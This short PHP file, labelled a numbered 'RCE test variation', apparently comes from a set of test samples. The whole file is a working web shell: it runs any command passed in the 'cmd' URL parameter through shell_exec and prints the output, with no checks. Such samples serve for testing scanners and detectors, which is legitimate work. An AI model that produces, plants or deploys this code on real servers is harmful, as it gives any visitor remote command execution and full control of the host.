<?php
// RCE test variation #188
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>